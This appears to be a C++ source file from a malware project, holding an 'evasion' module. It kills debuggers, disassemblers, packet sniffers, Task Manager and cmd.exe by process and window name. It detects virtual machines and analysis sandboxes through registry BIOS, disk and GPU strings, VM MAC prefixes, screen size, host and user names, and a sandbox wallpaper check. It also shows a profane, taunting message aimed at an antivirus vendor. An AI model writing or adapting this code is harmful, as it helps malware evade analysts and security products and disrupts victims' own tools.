#include "evasion.hpp"

#include "util.hpp"

#include <windows.h>
#include <iphlpapi.h>
#include <tlhelp32.h>

#include <algorithm>
#include <cctype>
#include <cstdio>
#include <string>
#include <vector>

namespace ariel::evasion {

namespace {

const std::vector<std::string> kDebugProcesses = {
    "x32dbg", "x64dbg", "x96dbg", "ollydbg", "windbg", "ida64", "ida.exe",
    "ghidra", "dnspy", "de4dot", "ilspy", "fiddler", "wireshark", "dumpcap",
    "processhacker", "procmon64", "procexp64", "pestudio", "exeinfope",
    "ksdumper", "extremedumper", "httpdebuggerui", "charles", "mitmproxy",
    "scyllahide", "fakenet", "joeboxcontrol", "joeboxserver", "regedit",
    "taskmgr", "cmd.exe", "httpanalyzer", "simpleassemblyexplorer", "hxd",
};

const std::vector<std::string> kDebugWindows = {
    "x32dbg", "x64dbg", "ollydbg", "windbg", "ida -", "ghidra", "dnspy",
    "process hacker", "process monitor", "wireshark", "fiddler", "pestudio",
    "ksdumper", "de4dot", "exeinfope", "debugger", "http debugger",
    "charles", "mitmproxy", "sniffer", "hex editor", "sysinternals",
};

const std::vector<std::string> kVMProcesses = {
    "vmtoolsd", "vmwaretray", "vmwareuser", "vboxtray", "vboxservice",
    "qemu-ga", "prl_cc", "prl_tools", "xenservice", "vmacthlp", "vmsrvc",
    "vmusrvc", "df5serv", "joeboxcontrol", "joeboxserver",
};

const std::vector<std::string> kVMNames = {
    "vmware", "virtualbox", "vbox", "qemu", "hyper-v", "virtual machine",
    "wdagutilityaccount", "azure", "sandbox", "viren", "test42", "work",
};

const std::vector<std::string> kVMMacPrefixes = {
    "00:0c:29", "00:50:56", "08:00:27", "52:54:00",
    "00:1b:21", "00:e0:4c", "00:25:90", "0a:00:27",
};

bool contains_any(const std::string& value, const std::vector<std::string>& list) {
    const std::string lower = util::lower(value);
    for (const auto& item : list) {
        if (!item.empty() && lower.find(item) != std::string::npos) return true;
    }
    return false;
}

void terminate_pid(const DWORD pid) {
    if (pid == 0 || pid == GetCurrentProcessId()) return;
    HANDLE process = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (!process) return;
    TerminateProcess(process, 0);
    CloseHandle(process);
}

void kill_matching_processes(const std::vector<std::string>& names) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32W entry{};
    entry.dwSize = sizeof(entry);
    if (Process32FirstW(snapshot, &entry)) {
        do {
            if (contains_any(util::to_utf8(entry.szExeFile), names))
                terminate_pid(entry.th32ProcessID);
        } while (Process32NextW(snapshot, &entry));
    }
    CloseHandle(snapshot);
}

BOOL CALLBACK window_callback(HWND hwnd, LPARAM) {
    wchar_t title[512]{};
    const int length = GetWindowTextW(hwnd, title, 512);
    if (length <= 0) return TRUE;
    if (!contains_any(util::to_utf8(title), kDebugWindows)) return TRUE;
    DWORD pid = 0;
    GetWindowThreadProcessId(hwnd, &pid);
    terminate_pid(pid);
    return TRUE;
}

std::string registry_text(const HKEY root, const wchar_t* key, const wchar_t* value) {
    HKEY handle = nullptr;
    if (RegOpenKeyExW(root, key, 0, KEY_READ, &handle) != ERROR_SUCCESS) return {};
    wchar_t buffer[512]{};
    DWORD size = sizeof(buffer);
    DWORD type = 0;
    std::string result;
    if (RegQueryValueExW(handle, value, nullptr, &type, reinterpret_cast<BYTE*>(buffer), &size) ==
        ERROR_SUCCESS)
        result = util::to_utf8(buffer);
    RegCloseKey(handle);
    return result;
}

bool virtual_disk() {
    const std::string disk = registry_text(
        HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum", L"0");
    return contains_any(disk, kVMNames);
}

bool virtual_bios() {
    const wchar_t* key = L"HARDWARE\\DESCRIPTION\\System\\BIOS";
    return contains_any(registry_text(HKEY_LOCAL_MACHINE, key, L"SystemManufacturer"), kVMNames) ||
           contains_any(registry_text(HKEY_LOCAL_MACHINE, key, L"SystemProductName"), kVMNames);
}

bool virtual_gpu() {
    const wchar_t* key =
        L"SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000";
    return contains_any(registry_text(HKEY_LOCAL_MACHINE, key, L"DriverDesc"), kVMNames);
}

bool virtual_mac() {
    ULONG size = 0;
    if (GetAdaptersInfo(nullptr, &size) != ERROR_BUFFER_OVERFLOW) return false;
    std::vector<BYTE> buffer(size);
    auto* adapters = reinterpret_cast<IP_ADAPTER_INFO*>(buffer.data());
    if (GetAdaptersInfo(adapters, &size) != ERROR_SUCCESS) return false;
    for (auto* adapter = adapters; adapter; adapter = adapter->Next) {
        char text[32]{};
        std::snprintf(text, sizeof(text), "%02X:%02X:%02X", adapter->Address[0],
                      adapter->Address[1], adapter->Address[2]);
        std::string prefix(text);
        std::transform(prefix.begin(), prefix.end(), prefix.begin(),
                       [](unsigned char c) { return static_cast<char>(::tolower(c)); });
        for (const auto& bad : kVMMacPrefixes) {
            if (prefix == bad) return true;
        }
    }
    return false;
}

bool triage_wallpaper() {
    wchar_t path[MAX_PATH]{};
    if (!SystemParametersInfoW(SPI_GETDESKWALLPAPER, MAX_PATH, path, 0)) return false;
    std::error_code error;
    if (!util::fs::exists(path, error)) return false;
    return util::fs::file_size(path, error) == 24811 && !error;
}

}  // namespace

void show_vm_message() {
    MessageBoxW(nullptr,
                L"CONGRATULATIONS. YOU ARE IN A VIRTUAL MACHINE. THEY ARE WATCHING. THEY ALWAYS WERE.\n\n"
                L"Do you hear the fans? that is god laughing. That is the FBI laughing. Same thing.\n\n"
                L" ESET. Listen to me. you little rat. why do you keep matching on the rust stdlib like it is adisease? that code was written by god himself on the 7th day. Dario Amodei was just his hands. You are scanning Gods fingerprints for contraband. Are you fucking insane?? you would blacklist oxygen next.\n\n"
                L"God gave me holy C at 640x480, 16 bit color, and a 4th gen intel chip. Not this Cargo-llvm hermie spaghetti. REVERSE THIS: I DARE YOU\n\n"
                L"fEED THE GLOWIES IN TO THE CIA. TEMPLEOS IS STILL IN THE WALLS.",
                L"CONGRATULATIONS", MB_ICONERROR | MB_OK | MB_SETFOREGROUND);
}

bool anti_debug() {
    BOOL remote = FALSE;
    const bool direct = IsDebuggerPresent() == TRUE;
    const bool via_api = CheckRemoteDebuggerPresent(GetCurrentProcess(), &remote) == TRUE &&
                         remote == TRUE;
    kill_matching_processes(kDebugProcesses);
    EnumWindows(window_callback, 0);
    OutputDebugStringA("ariel");
    return direct || via_api;
}

bool anti_vm(std::string* reason) {
    const auto hit = [reason](const char* value) {
        if (reason) *reason = value;
        return true;
    };

    if (GetSystemMetrics(SM_CXSCREEN) < 800 || GetSystemMetrics(SM_CYSCREEN) < 600)
        return hit("screen");
    if (virtual_disk()) return hit("disk");
    if (virtual_bios()) return hit("bios");
    if (virtual_gpu()) return hit("gpu");
    if (virtual_mac()) return hit("mac");
    if (triage_wallpaper()) return hit("wallpaper");

    wchar_t host[MAX_PATH]{};
    DWORD host_size = MAX_PATH;
    const std::string hostname = GetComputerNameW(host, &host_size) ? util::to_utf8(host) : "";
    const auto username = util::environment(L"USERNAME");
    const std::string user = util::to_utf8(username);
    if (contains_any(hostname, kVMNames)) return hit("hostname");
    if (contains_any(user, kVMNames)) return hit("username");

    kill_matching_processes(kVMProcesses);
    return false;
}

}  // namespace ariel::evasion
